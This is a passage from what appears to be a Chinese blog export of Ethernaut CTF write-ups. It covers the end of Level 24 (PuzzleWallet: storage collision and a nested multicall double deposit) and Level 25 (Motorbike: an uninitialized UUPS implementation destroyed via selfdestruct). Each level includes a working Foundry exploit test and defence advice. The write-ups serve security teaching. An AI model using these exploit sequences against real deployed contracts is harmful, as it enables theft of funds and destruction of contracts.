class=\"line\">&#125;</span><br></pre></td></tr></table></figure>\n\n<p>由于代理模式使用 <code>delegatecall</code>，<code>PuzzleWallet</code> 的代码会直接操作 <code>PuzzleProxy</code> 的存储。这就导致了存储槽的冲突：</p>\n<ul>\n<li><code>PuzzleProxy</code> 的 <code>pendingAdmin</code> (slot 0) 实际上对应 <code>PuzzleWallet</code> 的 <code>owner</code> (slot 0)。</li>\n<li><code>PuzzleProxy</code> 的 <code>admin</code> (slot 1) 实际上对应 <code>PuzzleWallet</code> 的 <code>maxBalance</code> (slot 1)。</li>\n</ul>\n<p>我们的最终目标是成为 <code>PuzzleProxy</code> 的 <code>admin</code>。根据存储冲突，<strong>我们只需要将 <code>PuzzleWallet</code> 的 <code>maxBalance</code> 设置为我们的地址即可</strong>。</p>\n<h3 id=\"漏洞-2-成为-owner-并加入白名单\"><a href=\"#漏洞-2-成为-owner-并加入白名单\" class=\"headerlink\" title=\"漏洞 2: 成为 owner 并加入白名单\"></a>漏洞 2: 成为 <code>owner</code> 并加入白名单</h3><p>要调用 <code>setMaxBalance()</code>，我们必须是白名单用户。要加入白名单，我们必须是 <code>PuzzleWallet</code> 的 <code>owner</code>。</p>\n<ul>\n<li><code>PuzzleWallet</code> 的 <code>owner</code> 存储在 slot 0。</li>\n<li><code>PuzzleProxy</code> 的 <code>proposeNewAdmin()</code> 函数可以修改 <code>pendingAdmin</code>，也就是修改 slot 0。</li>\n</ul>\n<p>因此，第一步是通过调用 <code>proxy.proposeNewAdmin(player_address)</code> 来将 <code>wallet.owner</code> 设置为我们自己的地址。</p>\n<p>成为 <code>owner</code> 后，我们就可以调用 <code>wallet.addToWhitelist(player_address)</code> 将自己加入白名单。</p>\n<h3 id=\"漏洞-3-multicall-逻辑漏洞与清空合约余额\"><a href=\"#漏洞-3-multicall-逻辑漏洞与清空合约余额\" class=\"headerlink\" title=\"漏洞 3: multicall 逻辑漏洞与清空合约余额\"></a>漏洞 3: <code>multicall</code> 逻辑漏洞与清空合约余额</h3><p>现在我们是白名单用户了，但 <code>setMaxBalance()</code> 还有一个要求：<code>require(address(this).balance == 0, &quot;Contract balance is not 0&quot;)</code>。合约在部署时被存入了 0.001 ether，我们需要想办法将合约余额清空。</p>\n<p><code>execute()</code> 函数可以提款，但我们只能提出我们存入的金额。问题在于合约中已有的 0.001 ether。</p>\n<p>关键在于 <code>multicall()</code> 函数：</p>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">function multicall(bytes[] calldata data) external payable onlyWhitelisted &#123;</span><br><span class=\"line\">    bool depositCalled = false;</span><br><span class=\"line\">    for (uint i = 0; i &lt; data.length; i++) &#123;</span><br><span class=\"line\">        // ...</span><br><span class=\"line\">        if (selector == this.deposit.selector) &#123;</span><br><span class=\"line\">            require(!depositCalled, &quot;Deposit can only be called once&quot;);</span><br><span class=\"line\">            depositCalled = true;</span><br><span class=\"line\">        &#125;</span><br><span class=\"line\">        (bool success, ) = address(this).delegatecall(data[i]);</span><br><span class=\"line\">        // ...</span><br><span class=\"line\">    &#125;</span><br><span class=\"line\">&#125;</span><br></pre></td></tr></table></figure>\n\n<p>函数通过 <code>depositCalled</code> 标志位来防止在一次 <code>multicall</code> 中多次调用 <code>deposit()</code>。但是，这个保护措施是有缺陷的。<code>depositCalled</code> 是一个局部变量，它的作用域仅限于单次 <code>multicall</code> 调用。如果我们<strong>在一个 <code>multicall</code> 调用中嵌套另一个 <code>multicall</code> 调用</strong>，那么内部的 <code>multicall</code> 会有自己的、全新的 <code>depositCalled</code> 标志位。</p>\n<p>这允许我们绕过检查，实现“双重存款”：</p>\n<ol>\n<li>我们向 <code>multicall</code> 发送 0.001 ether。</li>\n<li><code>multicall</code> 的第一个调用是 <code>deposit()</code>。这会把我们的 <code>msg.value</code> (0.001 ether) 存入，并将我们的余额记录为 0.001 ether。</li>\n<li><code>multicall</code> 的第二个调用是<strong>对 <code>multicall</code> 自身的嵌套调用</strong>。在这个嵌套调用中，我们再次调用 <code>deposit()</code>。</li>\n<li>由于 <code>delegatecall</code> 的特性，<code>msg.value</code> 在嵌套调用中保持不变。因此，第二次 <code>deposit()</code> 会再次将同一个 <code>msg.value</code> (0.001 ether) 存入，使我们的记录余额变为 0.002 ether。</li>\n</ol>\n<p>我们只发送了 0.001 ether，但在合约中的存款记录却是 0.002 ether。现在，我们调用 <code>execute(player, 0.002 ether, &quot;&quot;)</code>，就可以提走合约中所有的资金（我们存入的0.001 + 合约原有的0.001）。</p>\n<h3 id=\"最终攻击流程\"><a href=\"#最终攻击流程\" class=\"headerlink\" title=\"最终攻击流程\"></a>最终攻击流程</h3><ol>\n<li><strong>成为 <code>owner</code></strong>: 调用 <code>proxy.proposeNewAdmin(player)</code>。</li>\n<li><strong>加入白名单</strong>: 调用 <code>wallet.addToWhitelist(player)</code>。</li>\n<li><strong>双重存款</strong>: 构造一个嵌套的 <code>multicall</code> 调用，发送 0.001 ether，使自己的存款记录变为 0.002 ether。</li>\n<li><strong>清空合约</strong>: 调用 <code>wallet.execute(player, 0.002 ether, &quot;&quot;)</code> 提走所有资金。</li>\n<li><strong>成为 <code>admin</code></strong>: 调用 <code>wallet.setMaxBalance(uint256(uint160(player)))</code>，将 <code>maxBalance</code> (即 <code>admin</code>) 设置为我们的地址。</li>\n</ol>\n<h2 id=\"💻-Foundry-实现\"><a href=\"#💻-Foundry-实现\" class=\"headerlink\" title=\"💻 Foundry 实现\"></a>💻 Foundry 实现</h2><figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br><span class=\"line\">14</span><br><span class=\"line\">15</span><br><span class=\"line\">16</span><br><span class=\"line\">17</span><br><span class=\"line\">18</span><br><span class=\"line\">19</span><br><span class=\"line\">20</span><br><span class=\"line\">21</span><br><span class=\"line\">22</span><br><span class=\"line\">23</span><br><span class=\"line\">24</span><br><span class=\"line\">25</span><br><span class=\"line\">26</span><br><span class=\"line\">27</span><br><span class=\"line\">28</span><br><span class=\"line\">29</span><br><span class=\"line\">30</span><br><span class=\"line\">31</span><br><span class=\"line\">32</span><br><span class=\"line\">33</span><br><span class=\"line\">34</span><br><span class=\"line\">35</span><br><span class=\"line\">36</span><br><span class=\"line\">37</span><br><span class=\"line\">38</span><br><span class=\"line\">39</span><br><span class=\"line\">40</span><br><span class=\"line\">41</span><br><span class=\"line\">42</span><br><span class=\"line\">43</span><br><span class=\"line\">44</span><br><span class=\"line\">45</span><br><span class=\"line\">46</span><br><span class=\"line\">47</span><br><span class=\"line\">48</span><br><span class=\"line\">49</span><br><span class=\"line\">50</span><br><span class=\"line\">51</span><br><span class=\"line\">52</span><br><span class=\"line\">53</span><br><span class=\"line\">54</span><br><span class=\"line\">55</span><br><span class=\"line\">56</span><br><span class=\"line\">57</span><br><span class=\"line\">58</span><br><span class=\"line\">59</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">// SPDX-License-Identifier: Unlicense</span><br><span class=\"line\">pragma solidity ^0.8.0;</span><br><span class=\"line\"></span><br><span class=\"line\">import &quot;forge-std/Test.sol&quot;;</span><br><span class=\"line\">import &quot;src/24_PuzzleWallet.sol&quot;;</span><br><span class=\"line\"></span><br><span class=\"line\">contract PuzzleWalletTest is Test &#123;</span><br><span class=\"line\">    PuzzleProxy proxy;</span><br><span class=\"line\">    address player;</span><br><span class=\"line\">    PuzzleWallet wallet;</span><br><span class=\"line\"></span><br><span class=\"line\">    function setUp() public &#123;</span><br><span class=\"line\">        player = vm.addr(1);</span><br><span class=\"line\"></span><br><span class=\"line\">        // 部署逻辑合约和代理合约</span><br><span class=\"line\">        PuzzleWallet puzzleWallet = new PuzzleWallet();</span><br><span class=\"line\">        bytes memory data = abi.encodeWithSelector(PuzzleWallet.init.selector, 1 ether);</span><br><span class=\"line\">        proxy = new PuzzleProxy(address(this), address(puzzleWallet), data);</span><br><span class=\"line\">        wallet = PuzzleWallet(address(proxy));</span><br><span class=\"line\"></span><br><span class=\"line\">        // 初始设置，存入 0.001 ether</span><br><span class=\"line\">        vm.deal(address(this), 0.001 ether);</span><br><span class=\"line\">        wallet.addToWhitelist(address(this));</span><br><span class=\"line\">        wallet.deposit&#123;value: 0.001 ether&#125;();</span><br><span class=\"line\">    &#125;</span><br><span class=\"line\"></span><br><span class=\"line\">    function testPuzzleWalletAttack() public &#123;</span><br><span class=\"line\">        vm.deal(player, 0.001 ether);</span><br><span class=\"line\">        vm.startPrank(player);</span><br><span class=\"line\"></span><br><span class=\"line\">        // 1. 成为 owner</span><br><span class=\"line\">        proxy.proposeNewAdmin(player);</span><br><span class=\"line\"></span><br><span class=\"line\">        // 2. 加入白名单</span><br><span class=\"line\">        wallet.addToWhitelist(player);</span><br><span class=\"line\"></span><br><span class=\"line\">        // 3. 构造嵌套 multicall 以实现双重存款</span><br><span class=\"line\">        bytes[] memory nestedCalls = new bytes[](1);</span><br><span class=\"line\">        nestedCalls[0] = abi.encodeWithSelector(PuzzleWallet.deposit.selector);</span><br><span class=\"line\"></span><br><span class=\"line\">        bytes[] memory calls = new bytes[](2);</span><br><span class=\"line\">        calls[0] = abi.encodeWithSelector(PuzzleWallet.deposit.selector);</span><br><span class=\"line\">        calls[1] = abi.encodeWithSelector(PuzzleWallet.multicall.selector, nestedCalls);</span><br><span class=\"line\">        </span><br><span class=\"line\">        // 发送 0.001 ether，但存款两次</span><br><span class=\"line\">        wallet.multicall&#123;value: 0.001 ether&#125;(calls);</span><br><span class=\"line\"></span><br><span class=\"line\">        // 4. 提走所有资金 (0.002 ether)</span><br><span class=\"line\">        wallet.execute(player, 0.002 ether, &quot;&quot;);</span><br><span class=\"line\"></span><br><span class=\"line\">        // 5. 成为 admin</span><br><span class=\"line\">        wallet.setMaxBalance(uint256(uint160(player)));</span><br><span class=\"line\"></span><br><span class=\"line\">        // 验证成功</span><br><span class=\"line\">        assertEq(proxy.admin(), player);</span><br><span class=\"line\"></span><br><span class=\"line\">        vm.stopPrank();</span><br><span class=\"line\">    &#125;</span><br><span class=\"line\">&#125;</span><br></pre></td></tr></table></figure>\n\n<h2 id=\"🛡️-防御措施\"><a href=\"#🛡️-防御措施\" class=\"headerlink\" title=\"🛡️ 防御措施\"></a>🛡️ 防御措施</h2><ol>\n<li><strong>对齐存储布局</strong>: 在使用代理模式时，必须确保代理合约和逻辑合约的存储布局是兼容的，以避免存储冲突。在代理合约中为未来的升级保留一些空的存储槽是一种常见的做法。</li>\n<li><strong>修复 <code>multicall</code> 漏洞</strong>: <code>multicall</code> 中的重入保护应该使用状态变量而不是局部变量。将 <code>depositCalled</code> 声明为合约的状态变量，并在 <code>multicall</code> 开始时设置，结束时清除，可以防止嵌套调用绕过检查。</li>\n<li><strong>原子化状态变更</strong>: 避免在一次函数调用中混合多种复杂逻辑（如存款和任意 <code>delegatecall</code>）。将功能分解为更小、更原子化的函数可以减少意外的交互。</li>\n</ol>\n<h2 id=\"🎯-总结\"><a href=\"#🎯-总结\" class=\"headerlink\" title=\"🎯 总结\"></a>🎯 总结</h2><p><strong>核心概念</strong>:</p>\n<ul>\n<li><strong>代理存储冲突</strong>: <code>delegatecall</code> 的核心风险之一。代理和逻辑合约的存储变量必须精确对齐，否则一个合约的变量可能会被另一个合约的函数意外地修改。</li>\n<li><strong>嵌套 <code>delegatecall</code></strong>: 对 <code>delegatecall</code> 的嵌套调用会继承原始调用的上下文（如 <code>msg.sender</code>, <code>msg.value</code>），但会创建新的局部变量作用域，这可能被用来绕过基于局部变量的安全检查。</li>\n</ul>\n<p><strong>攻击向量</strong>:</p>\n<ul>\n<li>利用存储冲突，通过调用一个看似无关的函数（<code>proposeNewAdmin</code>）来修改一个关键的状态变量（<code>owner</code>）。</li>\n<li>利用 <code>multicall</code> 中基于局部变量的重入保护缺陷，通过嵌套调用实现双重记账，从而窃取合约资金。</li>\n</ul>\n<p><strong>防御策略</strong>:</p>\n<ul>\n<li>仔细规划和验证代理合约的存储布局。</li>\n<li>使用状态变量来实现重入保护，而不是局部变量。</li>\n</ul>\n<h2 id=\"📚-参考资料\"><a href=\"#📚-参考资料\" class=\"headerlink\" title=\"📚 参考资料\"></a>📚 参考资料</h2><ul>\n<li><a href=\"https://docs.openzeppelin.com/upgrades-plugins/1.x/writing-upgradeable\">OpenZeppelin: Writing Upgradeable Contracts</a></li>\n<li><a href=\"https://swcregistry.io/docs/SWC-112\">SWC-112: Delegatecall to Untrusted Callee</a></li>\n</ul>\n"},{"title":"Ethernaut Level 25: Motorbike - UUPS代理未授权初始化漏洞","date":"2025-01-25T09:10:00.000Z","updated":"2025-01-25T09:10:00.000Z","series":"Ethernaut Foundry Solutions","excerpt":"利用UUPS代理模式中实现合约未被初始化的漏洞，直接调用实现合约的 `initialize` 函数成为 `upgrader`。随后，将实现合约升级为一个恶意的自毁合约，从而摧毁引擎，掌握 Motorbike 关卡的破解技巧。","_content":"\n# 🎯 Ethernaut Level 25: Motorbike - UUPS代理未授权初始化漏洞\n\n> **关卡链接**: [Ethernaut Level 25 - Motorbike](https://ethernaut.openzeppelin.com/level/25)  \n> **攻击类型**: 未初始化的实现合约 (Uninitialized Implementation)  \n> **难度**: ⭐⭐⭐⭐☆\n\n## 📋 挑战目标\n\n本关的目标是摧毁 `Engine` (引擎) 合约，即使得 `Engine` 合约的代码被从链上移除。你需要利用代理合约的漏洞来实现这一目标。\n\n![Motorbike Requirements](https://ethernaut.openzeppelin.com/imgs/BigLevel25.svg)\n\n## 🔍 漏洞分析\n\n本关卡涉及的是 UUPS (Universal Upgradeable Proxy Standard) 代理模式。在这种模式下，升级逻辑位于实现合约（`Engine`）中，而不是代理合约（`Motorbike`）中。\n\n-   `Motorbike`: 代理合约，负责将调用转发到 `Engine`。\n-   `Engine`: 实现合约，包含业务逻辑和升级逻辑。\n\n通常，代理合约在部署后会调用实现合约的 `initialize` 函数来设置初始状态（如 `owner`, `upgrader` 等）。然而，这个初始化调用只发生在代理合约的上下文中。**实现合约本身（即 `Engine` 合约）的 `initialize` 函数从未被调用过**，导致其状态变量（如 `upgrader`）仍为默认值（`address(0)`）。\n\n这就是核心漏洞：任何人都可以直接调用 `Engine` 实现合约的 `initialize()` 函数。\n\n```solidity\n// In Engine.sol\naddress public upgrader;\n\nfunction initialize() public {\n    require(upgrader == address(0)); // This check passes on the uninitialized Engine contract\n    upgrader = msg.sender;\n}\n```\n\n一旦我们调用了 `Engine` 的 `initialize()`，我们就会成为 `Engine` 合约的 `upgrader`。作为 `upgrader`，我们就可以调用 `upgradeToAndCall()` 函数。\n\n```solidity\n// In Engine.sol\nfunction upgradeToAndCall(address newImplementation, bytes memory data) public payable {\n    _authorizeUpgrade();\n    _upgradeToAndCall(newImplementation, data);\n}\n\nfunction _authorizeUpgrade() internal view {\n    require(msg.sender == upgrader, \"Can't upgrade\");\n}\n```\n\n`upgradeToAndCall()` 允许我们将 `Engine` 的实现指向一个全新的合约，并执行新合约中的任意函数。我们的攻击计划是：\n\n1.  **找到 `Engine` 实现合约的地址**: UUPS代理的实现地址存储在特定的存储槽位 `0x360894a13ba1a3210667c828492db98dca3e2076cc3735a920a3ca505d382bbc`。\n2.  **成为 `upgrader`**: 直接调用 `Engine` 合约的 `initialize()` 函数。\n3.  **部署恶意合约**: 创建一个包含 `selfdestruct` 逻辑的攻击合约。\n4.  **升级并自毁**: 调用 `Engine` 的 `upgradeToAndCall()`，将实现指向我们的恶意合约，并调用其自毁函数。\n\n**关于 Dencun 升级 (EIP-6780) 的说明**: 在 Dencun 升级后，`selfdestruct` 的行为发生了变化。它不再无条件地移除合约代码。然而，在许多测试环境和一些特定条件下，此攻击仍然有效。本解法基于 `selfdestruct` 能够移除合约代码的经典行为。\n\n## 💻 Foundry 实现\n\n### Foundry 测试代码\n\n测试代码将完整地模拟上述攻击流程。\n\n```solidity\n// SPDX-License-Identifier: Unlicense\npragma solidity ^0.8.0;\n\nimport \"forge-std/Test.sol\";\nimport \"src/25_Motorbike.sol\";\n\n// 接口定义\ninterface IEngine {\n    function initialize() external;\n    function upgradeToAndCall(address newImplementation, bytes memory data) external;\n    function upgrader() external view returns (address);\n}\n\n// 包含自毁逻辑的攻击合约\ncontract Attack {\n    function boom() external payable {\n        selfdestruct(payable(msg.sender));\n    }\n}\n\ncontract MotorbikeTest is Test {\n    Motorbike motorbikeInstance;\n    IEngine engineInstance;\n    address player;\n    address engineAddress;\n\n    function setUp() public {\n        player = vm.addr(1);\n        \n        // 部署关卡合约\n        Engine engine = new Engine();\n        motorbikeInstance = new Motorbike(address(engine));\n\n        // 从代理合约的存储中读取实现合约的地址\n        bytes32 implementationSlot = 0x360894a13ba1a3210667c828492db98dca3e2076cc3735a920a3ca505d382bbc;\n        engineAddress = address(uint160(uint256(vm.load(address(motorbikeInstance), implementationSlot))));\n        engineInstance = IEngine(engineAddress);\n    }\n\n    function testMotorbikeAttack() public {\n        vm.startPrank(player);\n\n        // 1. 部署攻击合约\n        Attack attackContract = new Attack();\n\n        // 2. 直接调用实现合约的 initialize 函数，成为 upgrader\n        engineInstance.initialize();\n        assertEq(engineInstance.upgrader(), player, \"Player should be the upgrader\");\n\n        // 3. 升级实现合约为我们的攻击合约，并调用 boom() 函数自毁\n        bytes memory data = abi.encodeWithSignature(\"boom()\");\n        engineInstance.upgradeToAndCall(address(attackContract), data);\n\n        // 4. 验证实现合约的代码是否已被移除\n        assertEq(engineAddress.code.length, 0, \"Engine contract should be destroyed\");\n\n        vm.stopPrank();\n    }\n}\n```\n\n### 关键攻击步骤\n\n1.  **定位实现合约**: 使用 `vm.load` 和 EIP-1967 定义的存储槽位地址，从代理合约中找到 `Engine` 实现合约的地址。\n2.  **调用 `initialize()`**: 直接与 `Engine` 合约交互，调用其 `initialize()` 函数，将 `player` 设置为 `upgrader`。\n3.  **部署攻击合约**: 创建一个简单的 `Attack` 合约，其中包含一个公共的 `boom()` 函数，该函数会调用 `selfdestruct`。\n4.  **执行 `upgradeToAndCall()`**: 调用 `Engine` 合约的 `upgradeToAndCall()`，将 `newImplementation` 设置为 `Attack` 合约的地址，并将 `data` 设置为 `boom()` 函数的函数选择器。\n\n## 🛡️ 防御措施\n\n1.  **初始化实现合约**: 在部署实现合约后，应立即调用其 `initialize` 函数（或在构造函数中完成初始化），以防止其他人抢先调用。可以添加一个 `initialized` 状态变量来确保初始化只进行一次。\n\n    ```solidity\n    // 修复建议\n    contract Engine {\n        bool private _initialized;\n        constructor() {\n            _disableInitializers();\n        }\n        function initialize() public initializer {\n            // ...\n        }\n    }\n    ```\n    OpenZeppelin 的 `Initializable` 合约提供了一个 `initializer` 修饰符，可以很好地解决这个问题。\n\n2.  **构造函数中初始化**: 对于不可升级的合约，应在 `constructor` 中完成所有初始化，以确保在部署时就设置好所有权和关键参数。\n\n## 🔧 相关工具和技术\n\n-   **UUPS (Universal Upgradeable Proxy Standard)**: EIP-1822 定义的一种代理模式，它将升级逻辑放在实现合约中，比旧的透明代理模式更节省 Gas。\n-   **EIP-1967**: 定义了代理合约中用于存储逻辑合约地址和管理员地址的标准存储槽位，以避免存储冲突。\n-   **未初始化的代理/实现**: 代理合约安全中一个常见的漏洞类别。无论是代理本身还是其实现合约，如果其初始化函数可以被任何人调用，就会导致严重的安全问题。\n\n## 🎯 总结\n\n**核心概念**:\n-   在使用 UUPS 代理模式时，不仅代理需要初始化，其底层的实现合约也需要被正确地初始化或禁用初始化函数。\n-   实现合约本身是一个独立的、可直接交互的合约，必须确保其公共/外部函数受到与代理合约相同的访问控制保护。\n\n**攻击向量**:\n-   找到未被初始化的实现合约。\n-   直接调用其初始化函数以获取特权（如 `upgrader` 角色）。\n-   利用获得的特权执行恶意操作（如升级到恶意实现并自毁）。\n\n**防御策略**:\n-   确保实现合约的构造函数或一个一次性的部署脚本会调用其初始化函数，并设置 `initialized` 标志，防止重入。\n-   使用经过审计和广泛使用的代理实现，如 OpenZeppelin 的 UUPS-Upgradeable 合约。\n\n## 📚 参考资料\n\n-   [EIP-1822: Universal Upgradeable Proxy Standard (UUPS)](https://eips.ethereum.org/EIPS/eip-1822)\n-   [OpenZeppelin Docs: UUPS Proxies](https://docs.openzeppelin.com/upgrades-plugins/1.x/uups-proxies)","source":"_posts/ethernaut-level-25-motorbike.md","raw":"---\ntitle: 'Ethernaut Level 25: Motorbike - UUPS代理未授权初始化漏洞'\ndate: 2025-01-25 17:10:00\nupdated: 2025-01-25 17:10:00\ncategories:\n  - Ethernaut 系列\n  - 高级攻击篇 (21-25)\ntags:\n  - Ethernaut\n  - Foundry\n  - Proxy\n  - UUPS\n  - Uninitialized Implementation\n  - 智能合约安全\nseries: Ethernaut Foundry Solutions\nexcerpt: \"利用UUPS代理模式中实现合约未被初始化的漏洞，直接调用实现合约的 `initialize` 函数成为 `upgrader`。随后，将实现合约升级为一个恶意的自毁合约，从而摧毁引擎，掌握 Motorbike 关卡的破解技巧。\"\n---\n\n# 🎯 Ethernaut Level 25: Motorbike - UUPS代理未授权初始化漏洞\n\n> **关卡链接**: [Ethernaut Level 25 - Motorbike](https://ethernaut.openzeppelin.com/level/25)  \n> **攻击类型**: 未初始化的实现合约 (Uninitialized Implementation)  \n> **难度**: ⭐⭐⭐⭐☆\n\n## 📋 挑战目标\n\n本关的目标是摧毁 `Engine` (引擎) 合约，即使得 `Engine` 合约的代码被从链上移除。你需要利用代理合约的漏洞来实现这一目标。\n\n![Motorbike Requirements](https://ethernaut.openzeppelin.com/imgs/BigLevel25.svg)\n\n## 🔍 漏洞分析\n\n本关卡涉及的是 UUPS (Universal Upgradeable Proxy Standard) 代理模式。在这种模式下，升级逻辑位于实现合约（`Engine`）中，而不是代理合约（`Motorbike`）中。\n\n-   `Motorbike`: 代理合约，负责将调用转发到 `Engine`。\n-   `Engine`: 实现合约，包含业务逻辑和升级逻辑。\n\n通常，代理合约在部署后会调用实现合约的 `initialize` 函数来设置初始状态（如 `owner`, `upgrader` 等）。然而，这个初始化调用只发生在代理合约的上下文中。**实现合约本身（即 `Engine` 合约）的 `initialize` 函数从未被调用过**，导致其状态变量（如 `upgrader`）仍为默认值（`address(0)`）。\n\n这就是核心漏洞：任何人都可以直接调用 `Engine` 实现合约的 `initialize()` 函数。\n\n```solidity\n// In Engine.sol\naddress public upgrader;\n\nfunction initialize() public {\n    require(upgrader == address(0)); // This check passes on the uninitialized Engine contract\n    upgrader = msg.sender;\n}\n```\n\n一旦我们调用了 `Engine` 的 `initialize()`，我们就会成为 `Engine` 合约的 `upgrader`。作为 `upgrader`，我们就可以调用 `upgradeToAndCall()` 函数。\n\n```solidity\n// In Engine.sol\nfunction upgradeToAndCall(address newImplementation, bytes memory data) public payable {\n    _authorizeUpgrade();\n    _upgradeToAndCall(newImplementation, data);\n}\n\nfunction _authorizeUpgrade() internal view {\n    require(msg.sender == upgrader, \"Can't upgrade\");\n}\n```\n\n`upgradeToAndCall()` 允许我们将 `Engine` 的实现指向一个全新的合约，并执行新合约中的任意函数。我们的攻击计划是：\n\n1.  **找到 `Engine` 实现合约的地址**: UUPS代理的实现地址存储在特定的存储槽位 `0x360894a13ba1a3210667c828492db98dca3e2076cc3735a920a3ca505d382bbc`。\n2.  **成为 `upgrader`**: 直接调用 `Engine` 合约的 `initialize()` 函数。\n3.  **部署恶意合约**: 创建一个包含 `selfdestruct` 逻辑的攻击合约。\n4.  **升级并自毁**: 调用 `Engine` 的 `upgradeToAndCall()`，将实现指向我们的恶意合约，并调用其自毁函数。\n\n**关于 Dencun 升级 (EIP-6780) 的说明**: 在 Dencun 升级后，`selfdestruct` 的行为发生了变化。它不再无条件地移除合约代码。然而，在许多测试环境和一些特定条件下，此攻击仍然有效。本解法基于 `selfdestruct` 能够移除合约代码的经典行为。\n\n## 💻 Foundry 实现\n\n### Foundry 测试代码\n\n测试代码将完整地模拟上述攻击流程。\n\n```solidity\n// SPDX-License-Identifier: Unlicense\npragma solidity ^0.8.0;\n\nimport \"forge-std/Test.sol\";\nimport \"src/25_Motorbike.sol\";\n\n// 接口定义\ninterface IEngine {\n    function initialize() external;\n    function upgradeToAndCall(address newImplementation, bytes memory data) external;\n    function upgrader() external view returns (address);\n}\n\n// 包含自毁逻辑的攻击合约\ncontract Attack {\n    function boom() external payable {\n        selfdestruct(payable(msg.sender));\n    }\n}\n\ncontract MotorbikeTest is Test {\n    Motorbike motorbikeInstance;\n    IEngine engineInstance;\n    address player;\n    address engineAddress;\n\n    function setUp() public {\n        player = vm.addr(1);\n        \n        // 部署关卡合约\n        Engine engine = new Engine();\n        motorbikeInstance = new Motorbike(address(engine));\n\n        // 从代理合约的存储中读取实现合约的地址\n        bytes32 implementationSlot = 0x360894a13ba1a3210667c828492db98dca3e2076cc3735a920a3ca505d382bbc;\n        engineAddress = address(uint160(uint256(vm.load(address(motorbikeInstance), implementationSlot))));\n        engineInstance = IEngine(engineAddress);\n    }\n\n    function testMotorbikeAttack() public {\n        vm.startPrank(player);\n\n        // 1. 部署攻击合约\n        Attack attackContract = new Attack();\n\n        // 2. 直接调用实现合约的 initialize 函数，成为 upgrader\n        engineInstance.initialize();\n        assertEq(engineInstance.upgrader(), player, \"Player should be the upgrader\");\n\n        // 3. 升级实现合约为我们的攻击合约，并调用 boom() 函数自毁\n        bytes memory data = abi.encodeWithSignature(\"boom()\");\n        engineInstance.upgradeToAndCall(address(attackContract), data);\n\n        // 4. 验证实现合约的代码是否已被移除\n        assertEq(engineAddress.code.length, 0, \"Engine contract should be destroyed\");\n\n        vm.stopPrank();\n    }\n}\n```\n\n### 关键攻击步骤\n\n1.  **定位实现合约**: 使用 `vm.load` 和 EIP-1967 定义的存储槽位地址，从代理合约中找到 `Engine` 实现合约的地址。\n2.  **调用 `initialize()`**: 直接与 `Engine` 合约交互，调用其 `initialize()` 函数，将 `player` 设置为 `upgrader`。\n3.  **部署攻击合约**: 创建一个简单的 `Attack` 合约，其中包含一个公共的 `boom()` 函数，该函数会调用 `selfdestruct`。\n4.  **执行 `upgradeToAndCall()`**: 调用 `Engine` 合约的 `upgradeToAndCall()`，将 `newImplementation` 设置为 `Attack` 合约的地址，并将 `data` 设置为 `boom()` 函数的函数选择器。\n\n## 🛡️ 防御措施\n\n1.  **初始化实现合约**: 在部署实现合约后，应立即调用其 `initialize` 函数（或在构造函数中完成初始化），以防止其他人抢先调用。可以添加一个 `initialized` 状态变量来确保初始化只进行一次。\n\n    ```solidity\n    // 修复建议\n    contract Engine {\n        bool private _initialized;\n        constructor() {\n            _disableInitializers();\n        }\n        function initialize() public initializer {\n            // ...\n        }\n    }\n    ```\n    OpenZeppelin 的 `Initializable` 合约提供了一个 `initializer` 修饰符，可以很好地解决这个问题。\n\n2.  **构造函数中初始化**: 对于不可升级的合约，应在 `constructor` 中完成所有初始化，以确保在部署时就设置好所有权和关键参数。\n\n## 🔧 相关工具和技术\n\n-   **UUPS (Universal Upgradeable Proxy Standard)**: EIP-1822 定义的一种代理模式，它将升级逻辑放在实现合约中，比旧的透明代理模式更节省 Gas。\n-   **EIP-1967**: 定义了代理合约中用于存储逻辑合约地址和管理员地址的标准存储槽位，以避免存储冲突。\n-   **未初始化的代理/实现**: 代理合约安全中一个常见的漏洞类别。无论是代理本身还是其实现合约，如果其初始化函数可以被任何人调用，就会导致严重的安全问题。\n\n## 🎯 总结\n\n**核心概念**:\n-   在使用 UUPS 代理模式时，不仅代理需要初始化，其底层的实现合约也需要被正确地初始化或禁用初始化函数。\n-   实现合约本身是一个独立的、可直接交互的合约，必须确保其公共/外部函数受到与代理合约相同的访问控制保护。\n\n**攻击向量**:\n-   找到未被初始化的实现合约。\n-   直接调用其初始化函数以获取特权（如 `upgrader` 角色）。\n-   利用获得的特权执行恶意操作（如升级到恶意实现并自毁）。\n\n**防御策略**:\n-   确保实现合约的构造函数或一个一次性的部署脚本会调用其初始化函数，并设置 `initialized` 标志，防止重入。\n-   使用经过审计和广泛使用的代理实现，如 OpenZeppelin 的 UUPS-Upgradeable 合约。\n\n## 📚 参考资料\n\n-   [EIP-1822: Universal Upgradeable Proxy Standard (UUPS)](https://eips.ethereum.org/EIPS/eip-1822)\n-   [OpenZeppelin Docs: UUPS Proxies](https://docs.openzeppelin.com/upgrades-plugins/1.x/uups-proxies)","slug":"ethernaut-level-25-motorbike","published":1,"comments":1,"layout":"post","photos":[],"_id":"cmfc7zbpm001xbf5qdfea5l1u","content":"<h1 id=\"🎯-Ethernaut-Level-25-Motorbike-UUPS代理未授权初始化漏洞\"><a href=\"#🎯-Ethernaut-Level-25-Motorbike-UUPS代理未授权初始化漏洞\" class=\"headerlink\" title=\"🎯 Ethernaut Level 25: Motorbike - UUPS代理未授权初始化漏洞\"></a>🎯 Ethernaut Level 25: Motorbike - UUPS代理未授权初始化漏洞</h1><blockquote>\n<p><strong>关卡链接</strong>: <a href=\"https://ethernaut.openzeppelin.com/level/25\">Ethernaut Level 25 - Motorbike</a><br><strong>攻击类型</strong>: 未初始化的实现合约 (Uninitialized Implementation)<br><strong>难度</strong>: ⭐⭐⭐⭐☆</p>\n</blockquote>\n<h2 id=\"📋-挑战目标\"><a 